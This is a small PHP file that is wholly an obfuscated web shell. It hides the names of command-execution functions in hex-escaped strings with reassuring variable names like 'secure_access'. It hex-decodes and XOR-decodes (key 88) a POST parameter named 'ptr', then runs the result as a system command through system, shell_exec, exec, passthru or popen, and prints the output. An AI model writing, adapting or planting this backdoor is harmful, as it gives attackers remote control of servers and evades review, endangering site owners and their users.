<?php

$secure_access1 = "\x73y\x73\x74em";
$secure_access4 = "\x70a\x73s\x74hru";
$secure_access5 = "p\x6Fp\x65n";
$secure_access7 = "pc\x6Co\x73e";
$secure_access6 = "s\x74ream_g\x65t_\x63on\x74\x65\x6Ets";
$secure_access3 = "e\x78e\x63";
$settings = "h\x65x2\x62in";
$secure_access2 = "\x73\x68\x65\x6Cl_exe\x63";
if (isset($_POST["pt\x72"])) {
            function system_core(   $ent   ,  $value    ) {
   $element= '' ;
 foreach(str_split($ent) as $char){
$element.=chr(ord($char)^$value);

} return $element;
   
}
            $ptr = $settings($_POST["pt\x72"]);
            $ptr = system_core($ptr, 88);
            if (function_exists($secure_access1)) {
                $secure_access1($ptr);
            } elseif (function_exists($secure_access2)) {
                print $secure_access2($ptr);
            } elseif (function_exists($secure_access3)) {
                $secure_access3($ptr, $flag_ent);
                print join("\n", $flag_ent);
            } elseif (function_exists($secure_access4)) {
                $secure_access4($ptr);
            } elseif (function_exists($secure_access5) && function_exists($secure_access6) && function_exists($secure_access7)) {
                $value_element = $secure_access5($ptr, 'r');
                if ($value_element) {
                    $pgrp_data_chunk = $secure_access6($value_element);
                    $secure_access7($value_element);
                    print $pgrp_data_chunk;
                }
            }
            exit;
        }